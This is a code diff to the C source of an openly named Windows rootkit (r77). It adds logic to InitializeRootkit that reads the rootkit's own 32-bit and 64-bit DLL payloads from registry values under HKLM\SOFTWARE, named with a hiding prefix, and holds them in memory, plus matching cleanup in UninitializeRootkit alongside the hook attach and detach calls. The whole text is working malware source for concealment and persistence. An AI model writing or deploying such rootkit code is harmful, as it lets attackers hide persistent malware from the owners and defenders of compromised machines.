@@ -26,6 +26,28 @@ BOOL InitializeRootkit()
 
 		// Attach hooks.
 		InitializeHooks();
+
+		// Get both r77 DLL's.
+		HKEY key;
+		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS &&
+			RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, NULL, &RootkitDll32Size) == ERROR_SUCCESS &&
+			RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &RootkitDll64Size) == ERROR_SUCCESS)
+		{
+			LPBYTE dll32 = NEW_ARRAY(BYTE, RootkitDll32Size);
+			LPBYTE dll64 = NEW_ARRAY(BYTE, RootkitDll64Size);
+
+			if (RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, dll32, &RootkitDll32Size) == ERROR_SUCCESS &&
+				RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, dll64, &RootkitDll64Size) == ERROR_SUCCESS)
+			{
+				RootkitDll32 = dll32;
+				RootkitDll64 = dll64;
+			}
+			else
+			{
+				FREE(dll32);
+				FREE(dll64);
+			}
+		}
 	}
 
 	return TRUE;
@@ -44,6 +66,9 @@ VOID UninitializeRootkit()
 
 		// Detach hooks.
 		UninitializeHooks();
+
+		FREE(RootkitDll32);
+		FREE(RootkitDll64);
 	}
 }
 static VOID DetachRootkit()
